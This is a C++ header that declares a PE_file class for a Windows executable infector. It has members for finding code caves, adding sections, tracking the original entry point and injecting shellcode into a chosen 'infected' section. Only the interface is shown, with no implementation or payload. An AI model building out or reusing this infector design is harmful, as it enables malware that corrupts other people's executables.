#pragma once
#include "stdafx.h"
#include "Shellcode.h"

namespace PE
{
	class PE_file
	{
	private:
		std::size_t file_size;
		HANDLE file_handle;
		HANDLE file_mapping;
		LPBYTE file_map_view;
		PIMAGE_DOS_HEADER dos_header;
		PIMAGE_NT_HEADERS nt_header;
		DWORD original_entry_point;
		PIMAGE_SECTION_HEADER infected_section;
		PIMAGE_SECTION_HEADER first_section_header;
		PIMAGE_SECTION_HEADER last_section_header;
		bool is_section_new = false;
		bool signature_verified = false;
		DWORD shellcode_index = 0;
		

	public:
		static std::string get_exe_name(const std::filesystem::path& p);
		PIMAGE_SECTION_HEADER get_first_header() { return first_section_header; };
		LPBYTE get_file_map_view() { return file_map_view; };
		static bool is_file_running(std::filesystem::path p);
		PIMAGE_NT_HEADERS get_nt_header() const { return nt_header; };
		DWORD get_oep() const { return original_entry_point; };
		PE_file(std::filesystem::path);
		~PE_file();
		void map_file();
		void parse_file();
		DWORD align(DWORD, DWORD);
		void add_new_section();
		void find_code_cave();
		void infect_into_section(const char*);
		void freeFile();
		bool check_32();
	};
}